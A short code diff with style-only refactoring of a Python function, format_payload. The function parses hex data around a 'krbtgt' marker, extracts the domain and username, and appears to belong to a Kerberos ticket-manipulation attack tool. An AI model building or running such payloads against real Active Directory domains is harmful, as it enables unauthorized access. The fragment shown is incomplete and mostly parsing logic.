@@ -57,7 +57,10 @@ def format_payload(args):
 
         #Parse out the username and domain with offset included
         log.info("[+] Parsing out the username, domain, and their respective offsets")
-        result = re.search(b'000000(.*)000000066b7262746774', h).group(1).split(b'0000000100000001000000')[1]
+        result = re.search(b'000000(.*)000000066b7262746774', h)[1].split(
+            b'0000000100000001000000'
+        )[1]
+
         domain_offset_hex = result[:2]
         log.debug("[~] Domain offset determined to be: %s in hex", domain_offset_hex)
         domain_offset_decimal = int(domain_offset_hex, base=16)
@@ -66,7 +69,7 @@ def format_payload(args):
         log.debug("[~] Domain determined to be: %s in hex", domain)
         new_result = result.split(domain)[1]
         result2 = re.search(b'(?:00)+(.+)', new_result)
-        username = result2.group(1)
+        username = result2[1]
         log.debug("[~] Username determined to be: %s in hex", username)
 
         #Find krbtgt offset and append data in front of it
@@ -79,7 +82,7 @@ def format_payload(args):
         log.info("[+] Converting necessary instances of domain to lowercase")
         lowercase_domain = binascii.unhexlify(domain)
         x = bytearray(lowercase_domain)
-        del x[0:1]
+        del x[:1]
         lowercase_domain_bytes = bytes(x)
         lowercase_domain = domain_offset_hex + binascii.hexlify(lowercase_domain_bytes.lower())
         log.debug("[~] Lowercase domain determined to be %s in hex", lowercase_domain)
